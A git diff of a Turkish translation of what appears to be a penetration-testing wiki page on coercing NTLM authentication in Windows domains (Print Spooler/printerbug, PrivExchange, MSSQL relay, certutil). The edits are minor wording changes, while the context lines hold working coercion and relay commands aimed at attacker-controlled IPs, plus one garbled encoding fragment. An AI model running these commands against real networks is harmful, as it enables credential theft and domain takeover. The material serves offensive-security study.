@@ -9,7 +9,7 @@
 ## Spooler Servisi İstismarı
 
 Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma görevleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
-Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması** yapması gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
+Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
 
 ### Alan üzerindeki Windows Sunucularını Bulma
 
@@ -17,7 +17,7 @@ PowerShell kullanarak, Windows kutularının bir listesini alın. Sunucular gene
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Spooler hizmetlerini dinleyenleri bulma
+### Spooler hizmetlerini dinleyen bulma
 
 Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Hizmetinin dinleyip dinlemediğini kontrol edin:
 ```bash
@@ -28,7 +28,7 @@ Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Servisten rastgele bir ana bilgisayara kimlik doğrulaması yapmasını isteyin
+### Servisi rastgele bir ana bilgisayara kimlik doğrulaması yapması için istekte bulunun
 
 [ **SpoolSample'ı buradan**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** derleyebilirsiniz.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kısıtlanmamış Delegasyon ile Birleştirme
 
-Eğer bir saldırgan [Kısıtlanmamış Delegasyon](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu ana bilgisayarı zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
+Eğer bir saldırgan [Kısıtlanmamış Delegasyon](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilecek** ve bunu kötüye kullanabilecektir ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Zorla Kimlik Doğrulama
 
@@ -49,9 +49,9 @@ Eğer bir saldırgan [Kısıtlanmamış Delegasyon](unconstrained-delegation.md)
 
 ## PrivExchange
 
-`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan ana bilgisayara kimlik doğrulaması yapmaya zorlamasına olanak tanır.
+`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.
 
-Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019 Öncesi Kümülatif Güncelleme'de alan üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
+Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019 Öncesi Kümülatif Güncelleme'de alan üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ya bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ya iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
 
 ## Windows İçinde
 
@@ -76,8 +76,6 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-
 # Issuing NTLM relay attack on the local server with custom command
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
-
 ### Certutil
 
 certutil.exe lolbin (Microsoft imzalı ikili) kullanarak NTLM kimlik doğrulamasını zorlamak mümkündür:
@@ -102,7 +100,7 @@ Eğer bir bilgisayara MitM saldırısı gerçekleştirebilir ve onun göreceği 
 ```
 ## NTLMv1 Kırma
 
-Eğer [NTLMv1 zorluklarını yakalayabilirseniz, bunları nasıl kıracağınızı buradan okuyun](../ntlm/#ntlmv1-attack).\
+Eğer [NTLMv1 zorluklarını yakalayabilirseniz, onları nasıl kıracağınızı buradan okuyun](../ntlm/#ntlmv1-attack).\
 &#xNAN;_&#x52;emember NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._
 
 {{#include ../../banners/hacktricks-training.md}}
